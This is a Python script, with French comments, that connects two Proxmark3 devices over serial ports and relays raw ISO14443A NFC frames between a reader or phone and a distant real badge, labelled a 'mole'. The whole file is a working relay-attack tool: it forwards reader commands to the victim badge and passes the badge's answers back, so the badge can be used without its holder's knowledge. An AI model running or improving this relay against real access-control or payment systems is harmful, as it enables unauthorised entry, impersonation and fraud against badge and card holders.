#!/usr/bin/env python3
import serial
import struct
import time

# --- Paramètres Ports ---
PROXY_PORT = '/dev/ttyACM0' # Côté Lecteur/Téléphone
MOLE_PORT  = '/dev/ttyACM1' # Côté Badge réel

# --- Constantes Iceman ---
CMD_HF_ISO14443A_READER = 0x0385
MAGIC = 0x61334d50
RESP_MAGIC = 0x62334d50

# Flags RAW : bit 1 (No Disc) + bit 3 (Raw) + bit 6 (Active Snoop)
# On ajoute bit 4 (Append CRC) pour laisser le hardware calculer les checksums
FLAGS = (1 << 1) | (1 << 3) | (1 << 6) | (1 << 4)

class RawRelay:
    def __init__(self):
        try:
            self.proxy = serial.Serial(PROXY_PORT, 460800, timeout=0.001)
            self.mole  = serial.Serial(MOLE_PORT, 460800, timeout=0.001)
            print(f"[*] Connecté : Proxy({PROXY_PORT}) & Mole({MOLE_PORT})")
        except Exception as e:
            print(f"[-] Erreur connexion : {e}")
            exit()

    def _build_pkt(self, data, flags):
        # Format MIX : 24 octets d'args (3x uint64) + data
        payload = struct.pack('<QQQ', flags, len(data), 0) + data
        head = struct.pack('<IHH', MAGIC, len(payload) & 0x7FFF, CMD_HF_ISO14443A_READER)
        return head + payload + b'\x33\x61'

    def _read_frame(self, ser):
        if ser.in_waiting < 10: return None
        head = ser.read(10)
        if len(head) < 10: return None
        magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', head)
        if magic != RESP_MAGIC: return None
        payload = ser.read(length_ng & 0x7FFF)
        ser.read(2) # Postamble
        return payload[24:] if len(payload) >= 24 else None

    def run(self):
        print("\n" + "="*50)
        print("   RELAY RAW FORCE - ECOUTE ACTIVE")
        print("="*50 + "\n")

        try:
            while True:
                # On "pousse" une commande vide pour garder le décodeur actif
                self.proxy.write(self._build_pkt(b'', FLAGS))
                
                # Lecture immédiate
                reader_bits = self._read_frame(self.proxy)
                
                if reader_bits:
                    # On ignore les trames de 1 octet type '00' ou '66' (souvent du bruit)
                    if len(reader_bits) > 1:
                        print(f"[LECTEUR] >> {reader_bits.hex()}")
                        
                        # Transmission à la Mole
                        self.mole.write(self._build_pkt(reader_bits, FLAGS))
                        
                        # Attente réponse Badge
                        time.sleep(0.002) # Petit délai pour laisser le tag répondre
                        tag_bits = self._read_frame(self.mole)
                        
                        if tag_bits:
                            print(f"   [TAG] << {tag_bits.hex()}")
                            self.proxy.write(self._build_pkt(tag_bits, FLAGS))
                
                # Petit sleep pour ne pas saturer l'USB, mais assez court pour le NFC
                time.sleep(0.001)

        except KeyboardInterrupt:
            print("\n[*] Arrêt.")

if __name__ == "__main__":
    RawRelay().run()